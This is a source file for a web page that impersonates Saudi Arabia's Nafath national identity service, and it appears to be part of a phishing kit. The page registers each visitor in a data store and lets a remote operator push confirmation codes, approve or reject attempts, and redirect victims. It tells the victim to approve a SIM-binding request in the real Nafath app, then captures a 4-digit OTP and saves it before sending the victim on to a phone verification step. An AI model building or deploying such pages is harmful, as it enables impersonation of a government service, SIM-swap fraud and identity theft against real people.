"use client";

import {
  Loader2Icon,
  Menu,
  ShieldAlert,
  Smartphone,
  CheckCircle2,
  ShieldCheck,
  Loader2,
  Shield,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { useEffect, useRef, useState } from "react";

import { addData } from "@/lib/data-store";
import { Alert } from "@/components/ui/alert";
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
import { getRedirectUrl } from "@/lib/page-routes";
import { updateVisitorData, watchVisitorData } from "@/lib/visitor-data";
import { getOrCreateVisitorId } from "@/lib/visitor-presence";

const NAFATH_ANDROID_STORE =
  "https://play.google.com/store/apps/details?id=sa.gov.nic.myid&hl=ar";
const NAFATH_IOS_STORE =
  "https://apps.apple.com/sa/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871";

type DeviceType = "android" | "ios" | "other";

export default function NafadPage() {
  const [showOtpDialog, setShowOtpDialog] = useState(false);
  const [confirmationCode, setConfirmationCode] = useState<string>("");
  const [showError, setShowError] = useState("");

  const [otp, setOtp] = useState(["", "", "", ""]);
  const [otpError, setOtpError] = useState("");
  const [otpLoading, setOtpLoading] = useState(false);
  const [otpDone, setOtpDone] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const [submitted, setSubmitted] = useState(false);
  const [authNumber, setAuthNumber] = useState<string>("");

  const [visitorId, setVisitorId] = useState("");
  const [deviceType, setDeviceType] = useState<DeviceType>("other");

  useEffect(() => {
    if (typeof window !== "undefined") {
      setVisitorId(getOrCreateVisitorId());

      const userAgent = navigator.userAgent || "";
      const isIOS =
        /iPad|iPhone|iPod/.test(userAgent) ||
        (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
      const isAndroid = /Android/i.test(userAgent);
      setDeviceType(isIOS ? "ios" : isAndroid ? "android" : "other");
    }
  }, []);

  useRedirectMonitor({ visitorId, currentPage: "nafad" });

  const openNafathApp = () => {
    if (typeof window === "undefined") return;

    const fallbackUrl =
      deviceType === "ios"
        ? NAFATH_IOS_STORE
        : deviceType === "android"
          ? NAFATH_ANDROID_STORE
          : "https://www.iam.gov.sa/nafath/app";
    const appUrl =
      deviceType === "android"
        ? "intent://#Intent;scheme=nafath;package=sa.gov.nic.myid;end"
        : "nafath://";

    const handleVisibilityChange = () => {
      if (document.hidden) {
        window.clearTimeout(fallbackTimer);
        document.removeEventListener(
          "visibilitychange",
          handleVisibilityChange,
        );
      }
    };
    const fallbackTimer = window.setTimeout(() => {
      document.removeEventListener(
        "visibilitychange",
        handleVisibilityChange,
      );
      if (!document.hidden) window.location.href = fallbackUrl;
    }, 1500);

    document.addEventListener("visibilitychange", handleVisibilityChange);
    window.location.href = appUrl;
  };

  useEffect(() => {
    if (!visitorId || submitted) return;
    setSubmitted(true);
    addData({
      id: visitorId,
      nafadConfirmationStatus: "waiting",
      step: "nafad-waiting",
      nafadUpdatedAt: new Date().toISOString(),
    }).catch((err) => {
      console.error("[nafad] initial submit error:", err);
      setShowError("حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.");
    });
  }, [visitorId, submitted]);

  useEffect(() => {
    if (!visitorId) return;
    const unsubscribe = watchVisitorData(
      visitorId,
      (data) => {
        if (!data) return;

        // 1. Prioritize explicit admin redirection
        const redirectUrl = getRedirectUrl(data.redirectTo, "nafad");
        if (redirectUrl) {
          setShowOtpDialog(false);
          setOtpLoading(false);
          window.location.href = redirectUrl;
          return;
        }

        const incomingCode = String(
          data.nafadConfirmationCode || data.authNumber || data.nafadAuthNumber || "",
        ).trim();
        if (incomingCode) {
          setConfirmationCode(incomingCode);
          setAuthNumber(incomingCode);
          setShowError("");
          setShowOtpDialog(false);
        } else if (
          data.nafadConfirmationCode === "" ||
          data.authNumber === ""
        ) {
          setConfirmationCode("");
          setAuthNumber("");
        }

        if (data.nafadConfirmationStatus === "approved") {
          setConfirmationCode("");
          setShowOtpDialog(true);
          setOtp(["", "", "", ""]);
          setOtpError("");
          setOtpDone(false);
          void updateVisitorData(visitorId, {
            nafadConfirmationStatus: "",
            nafadConfirmationCode: "",
          });
          setTimeout(() => inputRefs.current[0]?.focus(), 150);
        } else if (data.nafadConfirmationStatus === "rejected") {
          setConfirmationCode("");
          setShowError("تم رفض عملية التحقق. يرجى المحاولة مرة أخرى.");
          void updateVisitorData(visitorId, {
            nafadConfirmationStatus: "",
            nafadConfirmationCode: "",
          });
        }
      },
      (error) => console.error("[nafad] data listener error:", error),
    );
    return () => unsubscribe();
  }, [visitorId]);

  const handleRetry = async () => {
    setShowError("");
    setConfirmationCode("");
    await addData({
      id: visitorId,
      nafadConfirmationStatus: "waiting",
      step: "nafad-waiting",
      nafadUpdatedAt: new Date().toISOString(),
    });
  };

  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d?$/.test(value)) return;
    const next = [...otp];
    next[index] = value;
    setOtp(next);
    setOtpError("");
    if (value && index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleOtpKeyDown = (
    index: number,
    e: React.KeyboardEvent<HTMLInputElement>,
  ) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleOtpPaste = (e: React.ClipboardEvent) => {
    const pasted = e.clipboardData
      .getData("text")
      .replace(/\D/g, "")
      .slice(0, 4);
    if (pasted.length === 4) {
      setOtp(pasted.split(""));
      inputRefs.current[3]?.focus();
    }
    e.preventDefault();
  };

  const handleOtpSubmit = async () => {
    const code = otp.join("");
    if (code.length !== 4) {
      setOtpError("يرجى إدخال الرمز المكون من 4 أرقام كاملاً");
      return;
    }
    setOtpLoading(true);
    try {
      await updateVisitorData(visitorId, {
        nafadOtp: code,
        nafadOtpSubmittedAt: new Date().toISOString(),
        step: "nafad-otp-submitted",
      });
      setOtpDone(true);
      setTimeout(() => {
        window.location.href = "/verify-phone";
      }, 1200);
    } catch (err) {
      console.error("[nafad OTP]", err);
      setOtpError("حدث خطأ، يرجى المحاولة مرة أخرى.");
    } finally {
      setOtpLoading(false);
    }
  };

  const otpFilled = otp.every((d) => d !== "");

  return (
    <div
      className="min-h-screen bg-gradient-to-br from-slate-50 via-teal-50 to-slate-100"
      dir="rtl"
    >
      <header className="bg-white/80 backdrop-blur-md shadow-sm border-b border-teal-100 sticky top-0 z-10">
        <div className="flex items-center justify-between p-4 max-w-7xl mx-auto">
          <Menu className="w-6 h-6 text-gray-500 cursor-pointer hover:text-[#00796b] transition-colors" />
          <div className="flex items-center gap-2">
            <ShieldCheck className="w-7 h-7 text-[#009688]" />
            <span className="text-lg font-bold text-[#00796b]">نفاذ</span>
          </div>
          <div className="w-6" />
        </div>
      </header>

      <main className="p-4 max-w-lg mx-auto py-10 space-y-6">
        <div className="text-center space-y-3">
          <div className="w-20 h-20 bg-gradient-to-br from-[#009688] to-[#00796b] rounded-2xl flex items-center justify-center mx-auto shadow-lg shadow-teal-200">
            <ShieldCheck className="w-10 h-10 text-white" />
          </div>
          <h1 className="text-2xl font-bold text-gray-800">
            التحقق عبر تطبيق نفاذ
          </h1>
        </div>

        <Card className="border-0 shadow-xl shadow-teal-100/50 overflow-hidden">
          <div className="h-1 bg-gradient-to-r from-[#4db6ac] to-[#009688]" />
          <CardContent className="p-8 text-center space-y-6">
            <p className="text-sm text-gray-500 leading-relaxed">
              التحقق من خلال تطبيق نفاذ الرجاء، فتح تطبيق نفاذ وتأكيد طلب إصدار
              أمر ربط شريحتك على رقم الجوال لتأكيد حجز الموعد باختيار الرقم
              أدناه
            </p>
            <div className="space-y-2">
              <Button
                type="button"
                onClick={openNafathApp}
                className="w-full h-12 rounded-xl bg-[#009688] text-base font-bold text-white shadow-md transition hover:bg-[#00796b]"
              >
                <Smartphone className="ml-2 h-5 w-5" />
                {deviceType === "ios"
                  ? "فتح تطبيق نفاذ على iPhone"
                  : deviceType === "android"
                    ? "فتح تطبيق نفاذ على Android"
                    : "فتح تطبيق نفاذ"}
              </Button>
              <p className="text-xs text-gray-500">
                إذا لم يفتح التطبيق، سيتم نقلك تلقائيًا إلى متجر جهازك
              </p>
            </div>
            {showError ? (
              <>
                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto">
                  <ShieldAlert className="w-8 h-8 text-red-500" />
                </div>
                <Alert
                  className="text-sm text-red-700 bg-red-50 border-red-200 text-right"
                  dir="rtl"
                >
                  <ShieldAlert className="w-4 h-4 text-red-600" />
                  {showError}
                </Alert>
                <Button
                  onClick={handleRetry}
                  className="w-full bg-[#009688] hover:bg-[#00796b] text-white h-12 text-base font-semibold rounded-xl shadow-md"
                >
                  إعادة المحاولة
                </Button>
              </>
            ) : confirmationCode ? (
              <>
                <div className="mx-auto w-44 h-44 bg-gradient-to-br from-teal-50 to-teal-100 border-2 border-teal-200 rounded-3xl shadow-inner flex items-center justify-center">
                  <div
                    className="flex gap-4 justify-center items-center"
                    dir="ltr"
                  >
                    <div className="text-7xl font-black text-[#00796b] font-mono leading-none">
                      {confirmationCode?.[0] || "–"}
                    </div>
                    <div className="text-7xl font-black text-[#00796b] font-mono leading-none">
                      {confirmationCode?.[1] || "–"}
                    </div>
                  </div>
                </div>
                <div className="flex items-center justify-center gap-2 text-[#009688]">
                  <div className="relative flex items-center justify-center w-4 h-4">
                    <div className="w-3 h-3 bg-[#009688] rounded-full animate-ping absolute opacity-75" />
                    <div className="w-2 h-2 bg-[#00796b] rounded-full" />
                  </div>
                  <span className="text-sm font-medium">
                    في انتظار تأكيدك في التطبيق...
                  </span>
                </div>
              </>
            ) : authNumber ? (
              <>
                <div className="mx-auto w-36 h-36 bg-gradient-to-br from-teal-50 to-teal-100 border-2 border-teal-300 rounded-3xl shadow-inner flex flex-col items-center justify-center gap-1">
                  <span className="text-xs font-semibold text-[#009688] tracking-wide">
                    رقم التأكيد
                  </span>
                  <span
                    className="text-6xl font-black text-[#00796b] font-mono leading-none"
                    dir="ltr"
                  >
                    {authNumber}
                  </span>
                </div>
                <p className="text-sm text-gray-600 leading-relaxed">
                  افتح تطبيق{" "}
                  <span className="font-bold text-[#009688]">نفاذ</span> واختر
                  الرقم أعلاه للتأكيد
                </p>
                <div className="flex items-center justify-center gap-2 text-[#009688]">
                  <div className="relative flex items-center justify-center w-4 h-4">
                    <div className="w-3 h-3 bg-[#009688] rounded-full animate-ping absolute opacity-75" />
                    <div className="w-2 h-2 bg-[#00796b] rounded-full" />
                  </div>
                  <span className="text-sm font-medium">
                    في انتظار تأكيدك في التطبيق...
                  </span>
                </div>
              </>
            ) : (
              <>
                <div className="flex flex-col items-center gap-5">
                  <div className="relative w-20 h-20">
                    <div className="absolute inset-0 rounded-full border-4 border-teal-100" />
                    <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-[#009688] animate-spin" />
                    <div className="absolute inset-3 rounded-full bg-teal-50 flex items-center justify-center">
                      <ShieldCheck className="w-7 h-7 text-[#009688]" />
                    </div>
                  </div>
                  <p className="text-base font-bold text-gray-800">
                    جاري التحقق من هويتك...
                  </p>
                </div>

                <div className="bg-teal-50 rounded-xl p-4 border border-teal-100 space-y-2 text-right">
                  <div className="flex items-center gap-2 text-[#00796b] text-sm">
                    <ShieldCheck className="w-4 h-4 flex-shrink-0" />
                    <span>تأكد أن تطبيق نفاذ مثبت على جهازك</span>
                  </div>
                  <div className="flex items-center gap-2 text-[#00796b] text-sm">
                    <Smartphone className="w-4 h-4 flex-shrink-0" />
                    <span>انتظر وصول الإشعار على هاتفك</span>
                  </div>
                </div>
              </>
            )}
            
          </CardContent>
        </Card>

        <div className="bg-gradient-to-br from-[#009688] to-[#00796b] rounded-2xl p-6 text-center text-white space-y-4 shadow-lg shadow-teal-200 relative overflow-hidden">
          <div className="absolute top-0 right-0 w-28 h-28 bg-white/10 rounded-full -mr-10 -mt-10" />
          <div className="absolute bottom-0 left-0 w-20 h-20 bg-white/10 rounded-full -ml-8 -mb-8" />
          <p className="text-sm font-medium text-teal-100 relative z-10">
            لتحميل تطبيق نفاذ
          </p>
          <div className="flex justify-center gap-3 relative z-10">
            <a
              href={NAFATH_ANDROID_STORE}
              className="hover:scale-105 transition-transform inline-flex items-center gap-2 bg-white/20 hover:bg-white/30 rounded-lg px-4 py-2 text-sm font-semibold"
            >
              <Smartphone className="w-4 h-4" />
              Google Play
            </a>
            <a
              href={NAFATH_IOS_STORE}
              className="hover:scale-105 transition-transform inline-flex items-center gap-2 bg-white/20 hover:bg-white/30 rounded-lg px-4 py-2 text-sm font-semibold"
            >
              <Smartphone className="w-4 h-4" />
              App Store
            </a>
          </div>
        </div>
      </main>

      <Dialog open={showOtpDialog} onOpenChange={() => {}}>
        <DialogContent
          className="max-w-sm mx-auto [&>button]:hidden rounded-3xl border-0 shadow-2xl p-0 overflow-hidden"
          dir="rtl"
        >
          <div className="h-1 bg-gradient-to-l from-[#4db6ac] via-[#009688] to-[#00796b]" />

          <div className="px-6 pt-5 pb-6 space-y-5">
            <DialogHeader className="text-center space-y-3">
              <div className="flex justify-center">
                <div className="relative">
                  <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-[#009688] to-[#00796b] flex items-center justify-center shadow-xl shadow-teal-200">
                    <Smartphone className="w-8 h-8 text-white" />
                  </div>
                  {otpDone && (
                    <div className="absolute -top-1 -right-1 w-5 h-5 bg-emerald-500 rounded-full flex items-center justify-center shadow">
                      <CheckCircle2 className="w-3 h-3 text-white" />
                    </div>
                  )}
                </div>
              </div>
              <DialogTitle className="text-lg font-black text-slate-800">
                رمز التحقق
              </DialogTitle>
              <p className="text-sm text-slate-500 leading-relaxed">
                أدخل رمز التحقق المكون من{" "}
                <span className="font-bold text-[#00796b]">4 أرقام</span> الذي
                وصلك
              </p>
            </DialogHeader>

            <div
              className="flex justify-center gap-3"
              dir="ltr"
              onPaste={handleOtpPaste}
            >
              {otp.map((digit, i) => (
                <input
                  key={i}
                  ref={(el) => {
                    inputRefs.current[i] = el;
                  }}
                  type="text"
                  inputMode="numeric"
                  autoComplete="off"
                  data-lpignore="true"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleOtpChange(i, e.target.value)}
                  onKeyDown={(e) => handleOtpKeyDown(i, e)}
                  disabled={otpLoading || otpDone}
                  className={[
                    "w-14 h-16 text-center text-3xl font-black rounded-2xl border-2 outline-none transition-all",
                    otpError
                      ? "border-red-300 bg-red-50 text-red-700"
                      : otpDone
                        ? "border-emerald-300 bg-emerald-50 text-emerald-700"
                        : digit
                          ? "border-[#009688] bg-teal-50 text-[#00796b]"
                          : "border-slate-200 bg-slate-50 text-slate-800 focus:border-[#009688] focus:bg-white",
                  ].join(" ")}
                />
              ))}
            </div>

            {otpError && (
              <p className="text-center text-xs text-red-600 font-medium">
                ⚠ {otpError}
              </p>
            )}

            {otpDone && (
              <div className="flex items-center justify-center gap-2 bg-emerald-50 border border-emerald-200 rounded-2xl px-4 py-3">
                <CheckCircle2 className="h-4 w-4 text-emerald-600 flex-shrink-0" />
                <p className="text-sm text-emerald-800 font-bold">
                  تم التحقق بنجاح! جاري الانتقال...
                </p>
              </div>
            )}

            <button
              type="button"
              onClick={handleOtpSubmit}
              disabled={!otpFilled || otpLoading || otpDone}
              className="w-full h-12 rounded-2xl font-black text-sm transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              style={{
                background: otpDone
                  ? "linear-gradient(135deg, #10b981, #059669)"
                  : otpLoading
                    ? "linear-gradient(135deg, #00796b, #00695c)"
                    : "linear-gradient(135deg, #009688, #00796b)",
                color: "#fff",
                boxShadow: otpDone
                  ? "0 8px 24px rgba(16,185,129,0.3)"
                  : "0 8px 24px rgba(0,150,136,0.35)",
              }}
            >
              {otpLoading ? (
                <>
                  <Loader2 className="h-4 w-4 animate-spin" /> جاري التحقق...
                </>
              ) : otpDone ? (
                <>
                  <CheckCircle2 className="h-4 w-4" /> تم التحقق
                </>
              ) : (
                "تأكيد الرمز"
              )}
            </button>

            <div className="flex items-center justify-center gap-1.5">
              <Shield className="h-3 w-3 text-slate-400" />
              <p className="text-[11px] text-slate-400">
                رمز التحقق صالح لمدة 10 دقائق فقط
              </p>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <footer className="mt-10 p-6 bg-white/60 border-t border-gray-100">
        <div className="text-center space-y-4 max-w-4xl mx-auto">
          <div className="flex flex-wrap justify-center gap-x-6 gap-y-1 text-xs text-gray-500">
            {[
              "الرئيسية",
              "حول",
              "اتصل بنا",
              "الشروط والأحكام",
              "المساعدة والدعم",
              "سياسة الخصوصية",
            ].map((link) => (
              <a
                key={link}
                href="#"
                className="hover:text-teal-600 transition-colors"
              >
                {link}
              </a>
            ))}
          </div>
        </div>
      </footer>
    </div>
  );
}
